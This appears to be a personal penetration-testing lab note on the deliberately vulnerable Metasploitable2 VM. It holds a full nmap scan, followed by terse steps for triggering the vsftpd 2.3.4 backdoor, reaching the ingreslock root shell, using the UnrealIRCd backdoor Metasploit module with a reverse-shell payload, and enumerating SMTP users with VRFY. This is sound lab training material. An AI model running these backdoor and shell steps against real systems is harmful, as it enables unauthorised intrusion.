# Metaspliotable2

## Nmap
```
nmap -A 192.168.1.119  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 11:30 EDT
Nmap scan report for 192.168.1.119
Host is up (0.0013s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_ssl-date: 2025-06-10T10:31:20+00:00; -4h59m49s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      38941/tcp   mountd
|   100005  1,2,3      45059/udp   mountd
|   100021  1,3,4      35847/tcp   nlockmgr
|   100021  1,3,4      40898/udp   nlockmgr
|   100024  1          55433/udp   status
|_  100024  1          55728/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, LongColumnFlag, SupportsTransactions, ConnectWithDatabase, SwitchToSSLAfterHandshake, SupportsCompression
|   Status: Autocommit
|_  Salt: $<BvNa}rE?J:~1srap1@
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2025-06-10T10:31:20+00:00; -4h59m49s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:01:13
|   source ident: nmap
|   source host: AA35889B.78DED367.FFFA6D49.IP
|_  error: Closing Link: aazpysvsv[192.168.1.117] (Quit: aazpysvsv)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
MAC Address: 00:0C:29:29:89:D5 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-06-10T06:31:10-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: -3h59m48s, deviation: 2h00m00s, median: -4h59m49s

TRACEROUTE
HOP RTT     ADDRESS
1   1.27 ms 192.168.1.119
```

## Ports

### 21
- anonymous ftp is open
	##### vsftpd 2.3.4 exploit (manual)
- "ctrl+]" then "quit" exit
```
telnet [ip] 21
user username:)
pass fakepass
```
![Pasted image 20250611102847](../../zzAttachments/Pasted%20image%2020250611102847.png)
```
telnet 192.168.1.119 6200
whoami;
id;
pwd;
```
![Pasted image 20250611103344](../../zzAttachments/Pasted%20image%2020250611103344.png)
##### vsftpd 2.3.4 exploit (metasploit)
```
use exploit/unix/ftp/vsftpd_234_backdoor
set rhosts [IP]
```
![Pasted image 20250611103701](../../zzAttachments/Pasted%20image%2020250611103701.png)
![Pasted image 20250611103737](../../zzAttachments/Pasted%20image%2020250611103737.png)

### 22

### 23

### 25
##### Banner Grab
```
nc 192.168.1.119 25
```
![Pasted image 20250611100012](../../zzAttachments/Pasted%20image%2020250611100012.png)
##### Commands learned from nmap
```
smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
```
##### enumerate usernames
```
VRFY root
```
![Pasted image 20250611101011](../../zzAttachments/Pasted%20image%2020250611101011.png)

### 80

### 111

### 139

### 445

### 512

### 513

### 514

### 1099

### 1524
##### ingreslock exploit
```
telnet [ip] 1524
```
![Pasted image 20250611104215](../../zzAttachments/Pasted%20image%2020250611104215.png)
### 2049

### 2121

### 3306

### 5432

### 5900

### 6000

### 6667
##### unreal_irc
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set payload 6
set rhost [IP]
set lhost eth0
```
![Pasted image 20250611095552](../../zzAttachments/Pasted%20image%2020250611095552.png)
![Pasted image 20250611095622](../../zzAttachments/Pasted%20image%2020250611095622.png)

### 8009

### 8180
